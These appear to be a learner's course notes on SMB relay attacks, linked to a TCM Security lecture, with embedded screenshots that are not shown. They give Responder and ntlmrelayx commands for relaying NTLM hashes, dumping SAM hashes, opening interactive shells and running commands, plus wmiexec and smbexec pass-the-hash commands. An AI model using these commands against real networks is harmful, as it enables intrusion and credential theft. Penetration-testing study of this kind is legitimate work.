#SMB #SMBRelayAttacks

---
# Links
TCM Video : https://academy.tcm-sec.com/courses/1152300/lectures/48477222



---

# Overview
![[Pasted image 20240909111928.png]]


![[Pasted image 20240909124143.png]]
- First hash is the LM
- second hash is the NT
- for cracking typically only need the NT portion



SEND HASHES INSTEAD OF CRACKING

Looking for on machine

![[Pasted image 20240909113244.png]]

Set up Responder 
![[Pasted image 20240909113449.png]]Switch off SMB and HTTP

Run Responder and set up ntlmrelayx
```
sudo responder -l 'nic' -dwP 
```
#ntlmrelayx
![[Pasted image 20240909113726.png]]



#ntlmrelayx 

![[Pasted image 20240909113803.png]]

```
sudo ntlmrelayx.py -tf 'target file' -smb2support
```


Use to relay repsonders hashes instead of trying to offline crack them
- need an event to occur like responder does
- dumps hashes of the SAM
- used to log into the machine with hashes


![[Pasted image 20240909114019.png]]


Can create interactive #shell with the -i

```
sudo ntlmrelayx.py -tf 'target file' -smb2support -i
```
![[Pasted image 20240909120727.png]]
Bind to shell with Netcat


Can run commands to for quick testing

```
sudo ntlmrelayx.py -tf 'target file' -smb2support -c "whoami"
```

# Other tools for shells
![[Pasted image 20240909124719.png]]

```
wmiexec.py username@ip -hashes NT:LM 
```

![[Pasted image 20240909125134.png]]

```
smbexec.py username@ip -hashes NT:LM
```
# Mitigation
![[Pasted image 20240909121816.png]]